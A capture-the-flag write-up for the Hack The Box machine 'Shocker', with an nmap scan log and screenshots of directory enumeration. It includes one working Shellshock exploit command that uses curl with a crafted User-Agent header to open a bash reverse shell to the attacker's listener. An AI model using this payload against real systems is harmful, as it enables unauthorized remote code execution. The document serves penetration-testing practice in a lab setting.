# shocker

## nmap scan
```log
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-15 05:50 EDT
Nmap scan report for 10.10.10.56
Host is up (0.17s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 4.2 (95%), Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 4.4 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   123.93 ms 10.10.16.1
2   206.08 ms 10.10.10.56

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.51 seconds

```


## web page
<p align="center">
  <img  src="Pasted image 20210715105154.png">
</p>
<p align="center">
  <img  src="Pasted image 20210715105217.png">
</p>

## directory enumeration
<p align="center">
  <img  src="Pasted image 20210715122218.png">
</p>

Found a `cgi-bin` folder, maybe its vulnerable to shellshock
('maybe' ? its literally the name of the machine `shock`)

anyway let's enumerate the files insides the folder.

<p align="center">
  <img  src="Pasted image 20210715122453.png">
</p>
Found `user.sh` file, let's exploit it

The command I used:
```bash
curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/10.10.16.63/4444 0>&1"' http://10.10.10.56/cgi-bin/user.sh
```

Got the shell :
<p align="center">
  <img  src="Pasted image 20210715122748.png">
</p>

## Privilege escalation
### shell stabilization
<p align="center">
  <img  src="Pasted image 20210715123008.png">
</p>
<p align="center">
  <img  src="Pasted image 20210715123130.png">
</p>
